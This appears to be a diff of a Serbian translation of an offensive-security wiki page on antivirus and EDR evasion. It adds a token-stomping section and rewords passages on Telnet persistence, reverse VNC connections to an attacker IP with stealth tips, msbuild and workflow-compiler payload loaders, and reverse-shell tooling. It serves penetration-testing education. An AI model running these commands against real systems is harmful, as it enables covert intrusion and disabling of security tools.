-Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti maliciozni kod koristeći druge jezike dajući kompromitovanoj mašini pristup **okruženju interpreter-a instaliranom na SMB deljenju pod kontrolom napadača**.
+Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti zlonamerni kod koristeći druge jezike dajući kompromitovanoj mašini pristup **okruženju interpreter-a instaliranom na SMB deljenju pod kontrolom napadača**.
 
-Omogućavanjem pristupa Interpreter Binaries i okruženju na SMB deljenju možete **izvršiti proizvoljni kod u ovim jezicima unutar memorije** kompromitovane mašine.
+Omogućavanjem pristupa Interpreter Binaries i okruženju na SMB deljenju možete **izvršiti proizvoljan kod u ovim jezicima unutar memorije** kompromitovane mašine.
 
-Repozitorijum ukazuje: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje sa nasumičnim neobfuskovanim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.
+Repozitorijum ukazuje: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statične potpise**. Testiranje sa nasumičnim neobfuskovanim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.
 
-## Napredna izbegavanja
+## TokenStomping
 
-Izbegavanje je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je prilično nemoguće ostati potpuno neotkriven u zrelim okruženjima.
+Token stomping je tehnika koja omogućava napadaču da **manipuliše pristupnim tokenom ili bezbednosnim proizvodom kao što je EDR ili AV**, omogućavajući im da smanje privilegije tako da proces ne umre, ali neće imati dozvole da proverava zlonamerne aktivnosti.
+
+Da bi se to sprečilo, Windows bi mogao **sprečiti spoljne procese** da dobiju handle-ove nad tokenima bezbednosnih procesa.
+
+- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
+- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
+- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)
+
+## Advanced Evasion
+
+Evasija je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.
 
 Svako okruženje protiv kojeg se borite imaće svoje snage i slabosti.
 
-Toplo vas savetujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli uvid u naprednije tehnike izbegavanja.
+Toplo vas savetujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli uvid u naprednije tehnike evasije.
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-Ovo je takođe još jedan sjajan govor od [@mariuszbit](https://twitter.com/mariuszbit) o izbegavanju u dubini.
+Ovo je takođe još jedan sjajan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasiji u dubini.
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
 {{#endref}}
 
-## **Stare tehnike**
+## **Old Techniques**
 
-### **Proverite koje delove Defender smatra malicioznim**
+### **Check which parts Defender finds as malicious**
 
-Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarne datoteke** dok ne **otkrije koji deo Defender** smatra malicioznim i podeliti to sa vama.\
-Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web uslugom koja nudi uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
+Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarne datoteke** dok ne **otkrije koji deo Defender** smatra zlonamernim i podeliti to sa vama.\
+Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web stranicom koja nudi uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Server**
 
@@ -319,7 +366,7 @@ Do Windows 10, svi Windows su dolazili sa **Telnet serverom** koji ste mogli ins
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-Neka se **pokrene** kada se sistem pokrene i **izvrši** ga sada:
+Neka **počinje** kada se sistem pokrene i **pokreni** ga sada:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
@@ -342,9 +389,9 @@ Zatim, premestite binarni _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.i
 
 #### **Obrnuta veza**
 
-**Napadač** treba da **izvrši unutar** svog **hosta** binarni `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**Napadač** treba da **izvrši unutar** svog **hosta** binarni `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**UPWARNING:** Da biste održali stealth, ne smete raditi nekoliko stvari
+**UPWARNING:** Da biste održali tajnost, ne smete raditi nekoliko stvari
 
 - Ne pokrećite `winvnc` ako već radi ili ćete aktivirati [popup](https://i.imgur.com/1SROTTl.png). proverite da li radi sa `tasklist | findstr winvnc`
 - Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
@@ -380,7 +427,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### Prvi C# Reverz shell
+#### Prvi C# Reverznog shell-a
 
 Kompajlirajte ga sa:
 ```
@@ -467,10 +514,6 @@ catch (Exception err) { }
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
-
-[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
-
 Automatsko preuzimanje i izvršavanje:
 ```csharp
 64bit:
@@ -529,6 +572,6 @@ https://github.com/praetorian-code/vulcan
 ```
 ### Više
 
-- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
+- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
 {{#include ../banners/hacktricks-training.md}}
